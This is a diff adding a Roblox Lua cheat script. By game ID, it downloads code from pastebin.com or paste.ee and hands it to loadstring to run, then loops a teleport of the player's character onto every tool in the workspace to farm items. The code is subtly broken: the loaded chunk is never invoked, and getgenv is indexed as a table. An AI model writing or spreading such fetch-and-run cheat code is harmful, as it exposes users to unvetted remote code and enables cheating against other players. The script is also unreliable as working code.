@@ -1,0 +1,22 @@
+local l1 = loadstring
+local g = game
+
+function l(id)
+	l1(g:HttpGet(id))
+end
+
+if g.GameId == 6704182071 then
+	l('https://pastebin.com/raw/MdEeisn8')
+elseif g.GameId == 5233268561 then
+	l('https://paste.ee/r/EBNx8')
+end
+
+if getgenv.AutoABDCopyToolsFarm == true then
+while wait() do
+for _,v in pairs(workspace:GetChildren()) do
+if v:IsA("Tool") then
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Handle.CFrame
+end
+end
+end
+end
